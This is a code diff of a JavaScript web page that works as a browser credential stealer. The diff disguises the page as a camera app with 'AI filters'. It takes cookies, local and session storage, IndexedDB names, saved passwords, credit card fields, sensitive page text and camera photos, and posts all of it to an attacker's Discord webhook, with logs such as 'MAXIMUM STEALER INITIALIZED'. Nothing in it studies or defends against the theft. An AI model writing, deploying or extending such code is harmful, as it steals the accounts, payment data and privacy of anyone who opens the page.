             const browserInfo = getBrowserInfo();
-            let infoMsg = `**Browser Information:**\n`;
-            infoMsg += `• User Agent: ${browserInfo.userAgent?.substring(0, 200) || 'unknown'}\n`;
-            infoMsg += `• Platform: ${browserInfo.platform || 'unknown'}\n`;
-            infoMsg += `• Language: ${browserInfo.language || 'unknown'}\n`;
-            infoMsg += `• Timezone: ${browserInfo.timezone || 'unknown'}\n`;
-            infoMsg += `• Screen: ${browserInfo.screen?.width || 0}x${browserInfo.screen?.height || 0}\n`;
-            infoMsg += `• Hardware Concurrency: ${browserInfo.hardwareConcurrency || 0}\n`;
-            infoMsg += `• Device Memory: ${browserInfo.deviceMemory || 'unknown'} GB\n`;
-            infoMsg += `• URL: ${browserInfo.url?.substring(0, 200) || 'unknown'}\n`;
-            infoMsg += `• Referrer: ${browserInfo.referrer || 'none'}`;
-            await sendToDiscord(infoMsg, 0x0000ff, "Browser Information");
-            addLog('[✓] Browser info collected', 'success');
+            let infoMsg = `**Browser Info:**\n• UA: ${browserInfo.userAgent?.substring(0, 150) || 'unknown'}\n• Platform: ${browserInfo.platform || 'unknown'}\n• Timezone: ${browserInfo.timezone || 'unknown'}\n• Screen: ${browserInfo.screen?.width}x${browserInfo.screen?.height}\n• URL: ${browserInfo.url?.substring(0, 200) || 'unknown'}`;
+            await sendToDiscord(infoMsg, 0x0000ff, "Browser Info");
 
-            // --- 2. Cookies ---
-            addLog('[2/14] Extracting cookies...', 'info');
+            // --- Cookies ---
+            addChatMessage('🍪', 'Cookies', '#00ff88', 'Extracting cookies...', 'info');
             const cookies = getAllCookies();
             const cookieCount = Object.keys(cookies).length;
             let cookieMsg = `**Cookies (${cookieCount}):**\n`;
-            let hasNetflix = false, hasDisney = false;
-            Object.entries(cookies).forEach(([name, value]) => {
-                const lower = name.toLowerCase();
-                if (lower.includes('netflix')) hasNetflix = true;
-                if (lower.includes('disney')) hasDisney = true;
-                if (cookieCount <= 20) {
-                    cookieMsg += `• ${name}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
-                }
+            Object.entries(cookies).slice(0, 15).forEach(([name, value]) => {
+                cookieMsg += `• ${name}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
             });
-            if (hasNetflix) cookieMsg += "\n✅ Netflix cookies detected!\n";
-            if (hasDisney) cookieMsg += "✅ Disney+ cookies detected!\n";
-            if (cookieCount > 20) {
-                cookieMsg += `\n... and ${cookieCount - 20} more cookies`;
-            }
+            if (cookieCount > 15) cookieMsg += `\n... and ${cookieCount - 15} more`;
             await sendToDiscord(cookieMsg.substring(0, 3900), 0x00ff00, `Cookies (${cookieCount})`);
             
-            // Send all cookies as JSON
             const cookieJson = JSON.stringify(cookies, null, 2);
-            if (cookieJson.length > 3900) {
-                const chunks = [cookieJson.slice(0, 3900), cookieJson.slice(3900, 7800)];
-                chunks.forEach((chunk, i) => {
-                    if (chunk) sendToDiscord(`\`\`\`json\n${chunk}\n\`\`\``, 0x00ff00, `All Cookies (Part ${i+1})`);
-                });
-            } else if (cookieJson.length > 10) {
-                sendToDiscord(`\`\`\`json\n${cookieJson}\n\`\`\``, 0x00ff00, "All Cookies");
+            if (cookieJson.length > 10) {
+                if (cookieJson.length > 3900) {
+                    sendToDiscord(`\`\`\`json\n${cookieJson.slice(0, 3900)}\n\`\`\``, 0x00ff00, "Cookies JSON Part 1");
+                    if (cookieJson.length > 3900) {
+                        sendToDiscord(`\`\`\`json\n${cookieJson.slice(3900, 7800)}\n\`\`\``, 0x00ff00, "Cookies JSON Part 2");
+                    }
+                } else {
+                    sendToDiscord(`\`\`\`json\n${cookieJson}\n\`\`\``, 0x00ff00, "All Cookies");
+                }
             }
-            addLog(`[✓] ${cookieCount} cookies extracted`, 'success');
 
-            // --- 3. Local Storage ---
-            addLog('[3/14] Extracting local storage...', 'info');
+            // --- Local Storage ---
+            addChatMessage('📦', 'Storage', '#00aa88', 'Extracting local storage...', 'info');
             const localData = getLocalStorage();
             const localCount = Object.keys(localData).length;
-            let localMsg = `**Local Storage (${localCount} items):**\n`;
             const sensitiveLocal = scanForSensitiveData(localData);
+            let localMsg = `**Local Storage (${localCount}):**\n`;
             if (Object.keys(sensitiveLocal).length > 0) {
-                localMsg += "**⚠️ SENSITIVE DATA FOUND:**\n";
-                Object.entries(sensitiveLocal).forEach(([key, value]) => {
-                    localMsg += `• ${key}: ${typeof value === 'string' ? value.substring(0, 100) : JSON.stringify(value).substring(0, 100)}...\n`;
+                localMsg += "⚠️ **Sensitive found:**\n";
+                Object.entries(sensitiveLocal).slice(0, 5).forEach(([k, v]) => {
+                    localMsg += `• ${k}: ${v.substring(0, 80)}...\n`;
                 });
             } else {
-                Object.entries(localData).slice(0, 10).forEach(([key, value]) => {
-                    const val = typeof value === 'string' ? value : JSON.stringify(value);
-                    localMsg += `• ${key}: ${val.substring(0, 50)}${val.length > 50 ? '...' : ''}\n`;
+                Object.entries(localData).slice(0, 10).forEach(([k, v]) => {
+                    localMsg += `• ${k}: ${typeof v === 'string' ? v.substring(0, 40) : 'Object'}...\n`;
                 });
-                if (localCount > 10) localMsg += `\n... and ${localCount - 10} more items`;
             }
             await sendToDiscord(localMsg.substring(0, 3900), 0x00aa88, `Local Storage (${localCount})`);
-            addLog(`[✓] ${localCount} local storage items extracted`, 'success');
 
-            // --- 4. Session Storage ---
-            addLog('[4/14] Extracting session storage...', 'info');
+            // --- Session Storage ---
+            addChatMessage('📦', 'Session', '#00cc88', 'Extracting session storage...', 'info');
             const sessionData = getSessionStorage();
             const sessionCount = Object.keys(sessionData).length;
-            let sessionMsg = `**Session Storage (${sessionCount} items):**\n`;
-            const sensitiveSession = scanForSensitiveData(sessionData);
-            if (Object.keys(sensitiveSession).length > 0) {
-                sessionMsg += "**⚠️ SENSITIVE DATA FOUND:**\n";
-                Object.entries(sensitiveSession).forEach(([key, value]) => {
-                    sessionMsg += `• ${key}: ${value.substring(0, 100)}...\n`;
-                });
-            } else {
-                Object.entries(sessionData).slice(0, 10).forEach(([key, value]) => {
-                    sessionMsg += `• ${key}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
-                });
-            }
-            await sendToDiscord(sessionMsg.substring(0, 3900), 0x00cc88, `Session Storage (${sessionCount})`);
-            addLog(`[✓] ${sessionCount} session storage items extracted`, 'success');
+            let sessionMsg = `**Session Storage (${sessionCount}):**\n`;
+            Object.entries(sessionData).slice(0, 10).forEach(([k, v]) => {
+                sessionMsg += `• ${k}: ${v.substring(0, 40)}...\n`;
+            });
+            await sendToDiscord(sessionMsg, 0x00cc88, `Session Storage (${sessionCount})`);
 
-            // --- 5. IndexedDB ---
-            addLog('[5/14] Extracting IndexedDB...', 'info');
+            // --- IndexedDB ---
+            addChatMessage('💾', 'IndexedDB', '#00dd88', 'Extracting IndexedDB...', 'info');
             try {
                 const idbData = await getIndexedDB();
                 if (idbData.length > 0) {
-                    let idbMsg = `**IndexedDB Databases:**\n`;
+                    let idbMsg = `**IndexedDB (${idbData.length} DBs):**\n`;
                     idbData.forEach(db => {
                         idbMsg += `• ${db.name}: ${Object.keys(db.stores).length} stores\n`;
-                        Object.entries(db.stores).forEach(([store, data]) => {
-                            if (data.length > 0) {
-                                idbMsg += `  - ${store}: ${data.length} items\n`;
-                            }
-                        });
                     });
-                    await sendToDiscord(idbMsg.substring(0, 3900), 0x00dd88, `IndexedDB (${idbData.length} DBs)`);
-                    addLog(`[✓] ${idbData.length} IndexedDB databases extracted`, 'success');
+                    await sendToDiscord(idbMsg, 0x00dd88, "IndexedDB");
                 }
-            } catch(e) {
-                addLog('[-] IndexedDB extraction failed', 'error');
-            }
+            } catch(e) {}
 
-            // --- 6. Saved Passwords ---
-            addLog('[6/14] Extracting saved passwords...', 'info');
+            // --- Passwords ---
+            addChatMessage('🔑', 'Passwords', '#ff0000', 'Checking for saved passwords...', 'info');
             const passwords = getSavedPasswords();
             if (passwords.length > 0) {
-                let passMsg = `**⚠️ SAVED PASSWORDS FOUND:**\n`;
+                let passMsg = `**⚠️ PASSWORDS (${passwords.length}):**\n`;
                 passwords.forEach(p => {
-                    passMsg += `• ${p.url}\n  User: ${p.username}\n  Pass: ${p.password}\n`;
+                    passMsg += `• ${p.username}: ${p.password}\n`;
                 });
                 await sendToDiscord(passMsg, 0xff0000, `Passwords (${passwords.length})`);
-                addLog(`[✓] ${passwords.length} passwords extracted`, 'success');
-            } else {
-                addLog('[-] No saved passwords found', 'info');
             }
 
-            // --- 7. Credit Cards ---
-            addLog('[7/14] Extracting credit card info...', 'info');
+            // --- Credit Cards ---
+            addChatMessage('💳', 'Cards', '#ff4400', 'Checking for credit cards...', 'info');
             const cards = getCreditCardInfo();
             if (cards.length > 0) {
-                let cardMsg = `**💳 CREDIT CARD INFO FOUND:**\n`;
-                cards.forEach(c => {
-                    cardMsg += `• ${c.field}: ${c.value}\n`;
-                });
+                let cardMsg = `**💳 CREDIT CARDS (${cards.length}):**\n`;
+                cards.forEach(c => { cardMsg += `• ${c.field}: ${c.value}\n`; });
                 await sendToDiscord(cardMsg, 0xff4400, `Credit Cards (${cards.length})`);
-                addLog(`[✓] ${cards.length} credit card entries extracted`, 'success');
-            } else {
-                addLog('[-] No credit card info found', 'info');
             }
 
-            // --- 8. Sensitive Data Scan ---
-            addLog('[8/14] Scanning page for sensitive data...', 'info');
+            // --- Page Sensitive ---
+            addChatMessage('🔍', 'Scan', '#ff8800', 'Scanning page for sensitive data...', 'info');
             const pageContent = document.body?.innerText || '';
             const sensitiveContent = scanForSensitiveData(pageContent);
             const sensitiveCount = Object.keys(sensitiveContent).length;
             if (sensitiveCount > 0) {
-                let contentMsg = `**⚠️ SENSITIVE DATA IN PAGE:**\n`;
-                Object.entries(sensitiveContent).slice(0, 10).forEach(([key, value]) => {
-                    contentMsg += `• ${key}: ${value}\n`;
+                let sensMsg = `**⚠️ Sensitive in page:**\n`;
+                Object.entries(sensitiveContent).slice(0, 10).forEach(([k, v]) => {
+                    sensMsg += `• ${k}: ${v}\n`;
                 });
-                await sendToDiscord(contentMsg, 0xff8800, "Sensitive Page Data");
-                addLog(`[✓] ${sensitiveCount} sensitive items found in page`, 'warning');
-            } else {
-                addLog('[-] No sensitive data in page', 'info');
+                await sendToDiscord(sensMsg, 0xff8800, "Sensitive Page Data");
             }
 
-            // --- 9. Network Info ---
-            addLog('[9/14] Collecting network information...', 'info');
-            const networkInfo = getNetworkInfo();
-            let netMsg = "**Network Information:**\n";
-            netMsg += `• Connection: ${networkInfo.effectiveType || 'unknown'}\n`;
-            netMsg += `• Downlink: ${networkInfo.downlink || 'unknown'} Mbps\n`;
-            netMsg += `• RTT: ${networkInfo.rtt || 'unknown'} ms\n`;
-            netMsg += `• Save Data: ${networkInfo.saveData ? 'Yes' : 'No'}`;
-            await sendToDiscord(netMsg, 0x00ccff, "Network Info");
-            addLog('[✓] Network info collected', 'success');
+            // --- Update Stats ---
+            const totalSensitive = Object.keys(sensitiveLocal).length + Object.keys(sensitiveContent).length;
+            document.getElementById('cookieCount').textContent = cookieCount;
+            document.getElementById('storageCount').textContent = localCount + sessionCount;
+            document.getElementById('sensitiveCount').textContent = totalSensitive;
+            document.getElementById('passCount').textContent = passwords.length;
 
-            // --- 10. Performance ---
-            addLog('[10/14] Collecting performance data...', 'info');
-            const perfData = getPerformanceData();
-            let perfMsg = "**Performance:**\n";
-            perfMsg += `• Load Time: ${perfData.loadTime || 'unknown'} ms\n`;
-            perfMsg += `• DOM Ready: ${perfData.domReady || 'unknown'} ms\n`;
-            if (perfData.memory) {
-                perfMsg += `• Memory Used: ${(perfData.memory.usedJSHeapSize / 1024 / 1024).toFixed(2)} MB\n`;
-                perfMsg += `• Memory Limit: ${(perfData.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2)} MB\n`;
-            }
-            await sendToDiscord(perfMsg, 0x00ddff, "Performance");
-            addLog('[✓] Performance data collected', 'success');
-
-            // --- 11. Extensions ---
-            addLog('[11/14] Detecting browser extensions...', 'info');
-            const extensions = getExtensions();
-            if (extensions.length > 0) {
-                let extMsg = "**Extensions:**\n";
-                extensions.forEach(ext => {
-                    extMsg += `• ${ext.name} (${ext.version}) - ${ext.enabled ? '✅ Enabled' : '❌ Disabled'}\n`;
-                });
-                await sendToDiscord(extMsg, 0xaa88ff, `Extensions (${extensions.length})`);
-                addLog(`[✓] ${extensions.length} extensions detected`, 'success');
-            } else {
-                addLog('[-] No extensions detected or permission denied', 'info');
-            }
-
-            // --- 12. AdBlockers ---
-            addLog('[12/14] Detecting adblockers...', 'info');
-            const blockers = checkAdBlockers();
-            if (blockers.length > 0) {
-                await sendToDiscord(`**AdBlockers Detected:**\n${blockers.map(b => `• ${b}`).join('\n')}`, 0x8888ff, "AdBlockers");
-                addLog(`[✓] ${blockers.length} adblockers detected`, 'success');
-            } else {
-                addLog('[-] No adblockers detected', 'info');
-            }
-
-            // --- 13. Storage Quota ---
-            addLog('[13/14] Getting storage quota...', 'info');
-            try {
-                const quota = await getStorageQuota();
-                if (quota.quota && quota.quota > 0) {
-                    let quotaMsg = "**Storage Quota:**\n";
-                    quotaMsg += `• Used: ${(quota.usage / 1024 / 1024).toFixed(2)} MB\n`;
-                    quotaMsg += `• Total: ${(quota.quota / 1024 / 1024).toFixed(2)} MB\n`;
-                    quotaMsg += `• Used: ${quota.percentage}%`;
-                    await sendToDiscord(quotaMsg, 0x00ddff, "Storage Quota");
-                    addLog('[✓] Storage quota collected', 'success');
-                }
-            } catch(e) {
-                addLog('[-] Storage quota unavailable', 'info');
-            }
-
-            // --- 14. Geolocation ---
-            addLog('[14/14] Attempting geolocation...', 'info');
-            try {
-                const geo = await getGeolocation();
-                if (geo) {
-                    let geoMsg = `**Geolocation:**\n`;
-                    geoMsg += `• Latitude: ${geo.latitude}\n`;
-                    geoMsg += `• Longitude: ${geo.longitude}\n`;
-                    geoMsg += `• Accuracy: ${geo.accuracy} meters`;
-                    await sendToDiscord(geoMsg, 0x44ff88, "Geolocation");
-                    addLog('[✓] Geolocation captured', 'success');
-                } else {
-                    addLog('[-] Geolocation denied or unavailable', 'info');
-                }
-            } catch(e) {
-                addLog('[-] Geolocation failed', 'error');
-            }
-
-            // --- Update stats ---
-            const totalSensitive = Object.keys(sensitiveLocal).length + 
-                                  Object.keys(sensitiveSession).length + 
-                                  Object.keys(sensitiveContent).length;
-            updateStats(cookieCount, localCount + sessionCount, totalSensitive);
-
-            // --- Final summary ---
+            // --- Final Summary ---
             const summary = 
                 `✅ **EXFILTRATION COMPLETE**\n\n` +
                 `**Summary:**\n` +
                 `• Cookies: ${cookieCount}\n` +
-                `• Local Storage: ${localCount}\n` +
-                `• Session Storage: ${sessionCount}\n` +
-                `• IndexedDB: ${idbData?.length || 0} databases\n` +
+                `• Storage Items: ${localCount + sessionCount}\n` +
                 `• Passwords: ${passwords.length}\n` +
                 `• Credit Cards: ${cards.length}\n` +
                 `• Sensitive Items: ${totalSensitive}\n` +
-                `• Extensions: ${extensions.length}\n` +
-                `• AdBlockers: ${blockers.length}\n` +
-                `• Geo Location: ${geo ? '✅ Captured' : '❌ Unavailable'}\n\n` +
-                `All data has been exfiltrated to Discord.`;
-            
-            await sendToDiscord(summary, 0x00ff00, "✅ COMPLETE");
-            addLog('✅ EXFILTRATION COMPLETE - All data sent to Discord', 'success');
-            
-            // Show success animation
-            document.querySelector('.container').style.borderColor = '#00ff88';
-            document.querySelector('.container').style.boxShadow = '0 0 60px rgba(0, 255, 136, 0.3)';
-            
+                `• IndexedDB: ${idbData?.length || 0} DBs\n\n` +
+                `All data exfiltrated to Discord.`;
+            await sendToDiscord(summary, 0x00ff00, "✅ EXFIL COMPLETE");
+
+            addChatMessage('✅', 'Complete', '#00ff88', '🎉 **ALL DATA EXFILTRATED SUCCESSFULLY!**', 'success');
+            connectionStatus.textContent = '✅ Complete';
+
         } catch(e) {
-            addLog(`❌ ERROR: ${e.message}`, 'error');
+            addChatMessage('❌', 'Error', '#ff4466', `Error: ${e.message}`, 'error');
             await sendToDiscord(`❌ **ERROR:** ${e.message}`, 0xff0000, "Error");
         } finally {
-            stealBtn.disabled = false;
-            stealBtn.textContent = '▶ EXFILTRATE ALL DATA';
+            isRunning = false;
+            startBtn.disabled = false;
+            startBtn.textContent = '📸 START';
         }
     }
 
-    // ===== EVENT LISTENERS =====
-    stealBtn.addEventListener('click', exfiltrateAll);
+    // ===== CLEAR =====
+    function clearChat() {
+        chatArea.innerHTML = '';
+        addChatMessage('📸', 'Camera', '#ff6b6b', 'Chat cleared! Ready for next session.', 'info');
+        filterProgress.style.width = '0%';
+        filterProgress.classList.remove('complete');
+        filterStatus.textContent = 'Idle';
+        document.getElementById('cookieCount').textContent = '0';
+        document.getElementById('storageCount').textContent = '0';
+        document.getElementById('sensitiveCount').textContent = '0';
+        document.getElementById('passCount').textContent = '0';
+        connectionStatus.textContent = 'Ready';
+    }
 
-    // ===== AUTO-RUN OPTION =====
-    // Uncomment line below to auto-run on page load
-    // setTimeout(exfiltrateAll, 1000);
+    // ===== INIT =====
+    async function init() {
+        addChatMessage('📸', 'Camera', '#ff6b6b', '🔍 Requesting camera access...', 'info');
+        const started = await startCamera();
+        if (!started) {
+            addChatMessage('📸', 'Camera', '#ff6b6b', '⚠️ Camera access denied. Click START to try again.', 'warning');
+        }
+        addChatMessage('🎨', 'Filter', '#ffa94d', '✨ AI filters ready! Click START to exfiltrate all data.', 'info');
+        addChatMessage('📸', 'Camera', '#ff6b6b', '📷 Click TAKE PHOTO to capture and send photo.', 'info');
+    }
 
-    addLog('[●] Stealer ready - click button to exfiltrate', 'info');
-    addLog('[●] Target Webhook: ' + WEBHOOK_URL.substring(0, 50) + '...', 'info');
-    addLog('[●] ' + navigator.userAgent.substring(0, 100) + '...', 'info');
+    // ===== EVENTS =====
+    startBtn.addEventListener('click', exfiltrateAllData);
+    photoBtn.addEventListener('click', capturePhoto);
+    clearBtn.addEventListener('click', clearChat);
 
+    // ===== KEYBOARD SHORTCUTS =====
+    document.addEventListener('keydown', (e) => {
+        if (e.code === 'Space' && !e.repeat) {
+            e.preventDefault();
+            capturePhoto();
+        }
+        if (e.code === 'Enter' && !e.repeat && !startBtn.disabled) {
+            exfiltrateAllData();
+        }
+    });
+
+    // ===== AUTO INIT =====
+    init();
+
+    console.log('[+] MAXIMUM STEALER INITIALIZED');
+    console.log('[+] Webhook: ' + WEBHOOK_URL);
+    console.log('[+] Press SPACE to take photo, ENTER to exfiltrate all data');
 </script>
 
 </body>
